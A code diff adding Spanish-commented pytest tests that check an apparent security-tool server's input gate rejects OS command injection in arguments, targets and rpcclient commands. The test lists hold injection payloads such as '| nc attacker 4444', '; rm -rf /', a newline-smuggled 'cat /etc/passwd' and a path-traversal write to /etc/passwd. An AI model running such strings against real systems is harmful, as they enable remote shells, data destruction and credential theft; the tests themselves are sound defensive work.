@@ -115,3 +115,113 @@ def test_etcd_passwd_intacto_tras_fix(mgr):
     before = Path("/etc/passwd").read_text()
     mgr.create_file("../../../../etc/passwd", "pwned")
     assert Path("/etc/passwd").read_text() == before
+
+
+# ── Shell input gate (OS Command Injection, OWASP ch03) ─────────────────────
+
+def test_validate_additional_args_permite_flags_legitimos():
+    ok = hx._validate_additional_args("--batch --random-agent -t 50 --dbms=mysql")
+    assert ok == "--batch --random-agent -t 50 --dbms=mysql"
+
+
+@pytest.mark.parametrize("payload", [
+    "; id",                       # separador
+    "&& echo pwned",              # and
+    "$(whoami)",                  # sustitución
+    "`whoami`",                   # backticks
+    "| nc attacker 4444",         # pipe
+    "--flag; rm -rf /",           # mezclado
+    "-o /tmp/x\ncat /etc/passwd",  # newline
+    "--arg 'v' ; whoami",         # quotes
+    "> /tmp/pwned",              # redirección
+    "$SECRET",                    # expansión de variable
+])
+def test_validate_additional_args_rechaza_inyeccion(payload):
+    with pytest.raises(ValueError):
+        hx._validate_additional_args(payload)
+
+
+def test_validate_target_permite_hosts_y_urls():
+    for ok in ["example.com", "192.168.1.1", "http://example.com:8080/path", "10.0.0.0/24"]:
+        assert hx._validate_target(ok) == ok
+
+
+@pytest.mark.parametrize("payload", [
+    "example.com; id",
+    "http://x.com/$(id)",
+    "x.com`id`",
+    "a b c",               # espacio rompe el argumento
+    "target & nc e 1",
+])
+def test_validate_target_rechaza_inyeccion(payload):
+    with pytest.raises(ValueError):
+        hx._validate_target(payload)
+
+
+def test_validate_free_value_permite_credenciales_legitimas():
+    # Contraseñas reales con símbolos NO son inyección mientras no tengan
+    # metacaracteres de shell
+    assert hx._validate_free_value("P@ssw0rd!#2026", "password") == "P@ssw0rd!#2026"
+
+
+@pytest.mark.parametrize("payload", [
+    "admin; id",
+    "$(whoami)",
+    "pwd | id",
+    "a\nb",
+])
+def test_validate_free_value_rechaza_inyeccion(payload):
+    with pytest.raises(ValueError):
+        hx._validate_free_value(payload, "password")
+
+
+def test_shell_gate_rechaza_request_con_inyeccion():
+    """El gate rechaza un POST a /api/tools/* con additional_args malicioso
+    con 400 ANTES de ejecutar nada. Usa el test client de Flask."""
+    client = hx.app.test_client()
+    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
+    # autenticado pero malicioso → 400 del shell gate
+    r = client.post("/api/tools/nmap", json={
+        "target": "example.com",
+        "additional_args": "; id"
+    }, headers=hdrs)
+    assert r.status_code == 400
+    assert "inyección" in r.get_json()["error"]
+
+
+def test_shell_gate_permite_request_legitimo_auth():
+    """Request autenticado con flags válidos pasa el gate (puede fallar
+    después por tool no instalado, pero no por el gate)."""
+    client = hx.app.test_client()
+    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
+    r = client.post("/api/tools/nmap", json={
+        "target": "example.com",
+        "additional_args": "-T4 -Pn"
+    }, headers=hdrs)
+    assert r.status_code != 400
+    assert "inyección" not in r.get_json().get("error", "")
+
+
+def test_gate_permite_commands_rpcclient_legitimo():
+    """El separador ';' de rpcclient es formato nativo (lista de comandos),
+    no inyección: 'enumdomusers;enumdomgroups' debe pasar el gate."""
+    client = hx.app.test_client()
+    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
+    r = client.post("/api/tools/rpcclient", json={
+        "target": "127.0.0.1",
+        "commands": "enumdomusers;enumdomgroups;querydominfo"
+    }, headers=hdrs)
+    assert r.status_code != 400
+    assert "inyección" not in r.get_json().get("error", "")
+
+
+def test_gate_rechaza_commands_rpcclient_inyectado():
+    """Pero '; id' dentro de commands SÍ es inyección real (comando shell
+    arbitrario concatenado tras un comando rpcclient) y debe rechazarse."""
+    client = hx.app.test_client()
+    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
+    r = client.post("/api/tools/rpcclient", json={
+        "target": "127.0.0.1",
+        "commands": "enumdomusers; id"
+    }, headers=hdrs)
+    assert r.status_code == 400
